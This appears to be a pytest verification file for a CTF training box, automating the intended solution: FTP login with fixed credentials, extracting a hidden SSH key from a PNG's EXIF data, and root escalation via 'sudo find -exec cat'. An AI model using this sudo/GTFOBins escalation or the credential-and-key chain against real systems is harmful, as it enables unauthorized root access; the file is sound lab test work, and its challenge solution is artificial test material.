"""Phase 10 verification: bonus-apex-cyber-defense -- rebuilt from a
standalone VirtualBox OVA ("Apex Cyber Defense -- Network Pentesting
Exam Lab") into a per-team container with Halcyon's own CTF_SECRET/HMAC
flag scheme, preserving the original's exact puzzle flow: web recon ->
CeWL/Hydra-discoverable FTP creds -> web directory enumeration -> a
base64 OpenSSH key hidden in a PNG's EXIF comment -> SSH foothold on a
non-default port -> sudo/GTFOBins root. This box has no nested_docker
dependency at all -- it's a plain single-host box like
noob-orientation-server -- so both backends work with zero
backend-specific code, parametrized below. It does use a passive FTP
port range (like noob), exercising the orchestrator's pasv_range
plumbing on a *second* box.

4 real flags, not 3 -- the source OVA's /home/ctf/flags/flag3.txt was
found to literally duplicate /root/root.txt's value (almost certainly
an authoring slip on the original box, caught by diffing the two
files' bytes). This rebuild keeps all 4 genuinely independent: flags
1-3 are each reachable both at their "main" location (HTML comment,
user.txt, a standalone FTP file) and redundantly as flag1.txt/
flag2.txt/flag3.txt over the same FTP session; flag 4 is the root
compromise (root.txt), distinct from flag 3.

Real HTTP, real FTP, real SSH, a real privilege escalation -- no mocks.
Requires the box image already built (ctf-boxes/bonus-apex-cyber-defense
:latest), `exiftool` on PATH, and a running orchestrator reachable at
ORCHESTRATOR_TEST_URL.
"""
import hashlib
import hmac
import os
import secrets as pysecrets
import subprocess
import tempfile
import time
from ftplib import FTP
from io import BytesIO

import pytest
import requests

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
BOX_ID = "bonus-apex-cyber-defense"
_TEAM_ID_BASE = pysecrets.randbelow(1_000_000)

FTP_USER = "alicesmith"
FTP_PASSWORD = "CyberVanguard"  # fixed/narrative -- discoverable via CeWL+Hydra, same for every team by design

_ID_RSA_PATH = os.path.join(
    os.path.dirname(__file__), "..", "boxes-src", BOX_ID, "docker", "scripts", "id_rsa",
)


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _port(inst: dict, container_port: int) -> int:
    for p in inst["ports"]:
        if p["container_port"] == container_port:
            return p["host_port"]
    raise AssertionError(f"no port {container_port} in instance ports: {inst['ports']}")


def _ssh_with_key(host: str, port: int, key_path: str, command: str, timeout: float = 20.0):
    return subprocess.run(
        [
            "ssh", "-i", key_path,
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
            "-p", str(port), f"alicesmith@{host}", command,
        ],
        capture_output=True, text=True, timeout=timeout,
    )


def _extract_key_from_backup_png(host: str, web_port: int) -> str:
    """Mirrors the real player path: download the hidden /backup/
    security_backup.png and decode the base64 OpenSSH key from its
    EXIF Comment tag -- never reads the box's own scripts/id_rsa
    directly, so this actually proves the stego mechanism works."""
    png_bytes = requests.get(f"http://{host}:{web_port}/backup/security_backup.png", timeout=10).content
    with tempfile.NamedTemporaryFile(suffix=".png") as f:
        f.write(png_bytes)
        f.flush()
        exif = subprocess.run(["exiftool", "-b", "-Comment", f.name], capture_output=True, text=True, check=True)
    import base64
    return base64.b64decode(exif.stdout.strip()).decode()


def _escalate_to_root(host: str, ssh_port: int, key_path: str) -> str:
    """The box's one intended privesc: alicesmith may run /usr/bin/find
    as root with NOPASSWD -- the textbook GTFOBins chain."""
    result = _ssh_with_key(host, ssh_port, key_path, "sudo /usr/bin/find /root/root.txt -exec cat {} \\;")
    assert result.returncode == 0, f"GTFOBins escalation failed: {result.stderr}"
    return result.stdout.strip()


@pytest.fixture(params=["docker", "kubernetes"])
def box_instance(request):
    backend = request.param
    team_id = _TEAM_ID_BASE + (1 if backend == "docker" else 2)
    secret = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id, "box_id": BOX_ID, "team_secret": secret, "backend": backend},
    )
    r.raise_for_status()
    inst = r.json()
    try:
        yield inst, secret, backend
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def _ftp_read(ftp: FTP, name: str) -> str:
    buf = BytesIO()
    ftp.retrbinary(f"RETR {name}", buf.write)
    return buf.getvalue().decode().strip()


def test_full_four_flag_chain(box_instance):
    inst, secret, backend = box_instance
    host = inst["entry_host"]
    web_port, ftp_port, ssh_port = _port(inst, 80), _port(inst, 21), _port(inst, 2222)

    # Flag 1: web recon -- plaintext, buried in an HTML comment.
    about = requests.get(f"http://{host}:{web_port}/about.html", timeout=10).text
    assert expected_flag(secret, 1) in about
    assert "alicesmith" in about  # the leaked username the rest of the chain depends on

    # FTP: the CeWL/Hydra-discoverable credential, real passive-mode transfer.
    # Flags 1-3 are also retrievable here as plain files, matching the
    # source OVA's own /home/ctf/flags/{flag1,flag2,flag3}.txt -- except
    # flag3.txt is a genuinely distinct 4th flag's sibling here, not a
    # duplicate of the root flag like it was on the original OVA.
    ftp = FTP()
    ftp.connect(host, ftp_port, timeout=15)
    ftp.login(FTP_USER, FTP_PASSWORD)
    names = ftp.nlst()
    assert "ssh_instructions.txt" in names
    instructions = _ftp_read(ftp, "ssh_instructions.txt")
    assert "2222" in instructions and "backup" in instructions.lower()

    assert "flag1.txt" in names and "flag2.txt" in names and "flag3.txt" in names
    ftp_flag1, ftp_flag2, ftp_flag3 = _ftp_read(ftp, "flag1.txt"), _ftp_read(ftp, "flag2.txt"), _ftp_read(ftp, "flag3.txt")
    assert ftp_flag1 == expected_flag(secret, 1)
    assert ftp_flag2 == expected_flag(secret, 2)
    assert ftp_flag3 == expected_flag(secret, 3)
    ftp.quit()

    # Stage 3: hidden web directory -> stego PNG -> decoded OpenSSH key.
    key_text = _extract_key_from_backup_png(host, web_port)
    assert "BEGIN OPENSSH PRIVATE KEY" in key_text

    with tempfile.NamedTemporaryFile(mode="w", suffix="_id_rsa", delete=False) as f:
        f.write(key_text)
        key_path = f.name
    os.chmod(key_path, 0o600)
    try:
        # Flag 2: SSH foothold on the non-default port, using the decoded key.
        user_txt = _ssh_with_key(host, ssh_port, key_path, "cat user.txt")
        assert user_txt.returncode == 0, user_txt.stderr
        assert expected_flag(secret, 2) in user_txt.stdout

        sudo_l = _ssh_with_key(host, ssh_port, key_path, "sudo -l")
        assert "/usr/bin/find" in sudo_l.stdout

        # Flag 4: GTFOBins root -- distinct from flag 3 (the two shared a
        # value on the source OVA; this rebuild keeps all 4 independent).
        root_flag = _escalate_to_root(host, ssh_port, key_path)
        assert root_flag == expected_flag(secret, 4)
        assert root_flag != expected_flag(secret, 3)
    finally:
        os.unlink(key_path)


def test_idempotent_create(box_instance):
    inst, secret, backend = box_instance
    r = requests.post(
        f"{BASE_URL}/instances",
        json={
            "team_id": inst["team_id"], "box_id": BOX_ID, "team_secret": "a-different-secret-must-be-ignored",
            "backend": backend,
        },
    )
    r.raise_for_status()
    assert r.json()["instance_id"] == inst["instance_id"]


def test_cross_team_flag_isolation(box_instance):
    """Two teams, two independent secrets -- flag 1 (the cheapest to
    check, pure HTTP) must differ between them, proving each instance's
    CTF_SECRET actually drives its own flag derivation rather than
    sharing state."""
    inst, secret, backend = box_instance
    team_id_b = inst["team_id"] + 1000
    secret_b = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id_b, "box_id": BOX_ID, "team_secret": secret_b, "backend": backend},
    )
    r.raise_for_status()
    inst_b = r.json()
    try:
        host_a, port_a = inst["entry_host"], _port(inst, 80)
        host_b, port_b = inst_b["entry_host"], _port(inst_b, 80)
        about_a = requests.get(f"http://{host_a}:{port_a}/about.html", timeout=10).text
        about_b = requests.get(f"http://{host_b}:{port_b}/about.html", timeout=10).text
        assert expected_flag(secret, 1) in about_a
        assert expected_flag(secret_b, 1) in about_b
        assert expected_flag(secret, 1) != expected_flag(secret_b, 1)
        assert expected_flag(secret, 1) not in about_b
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")
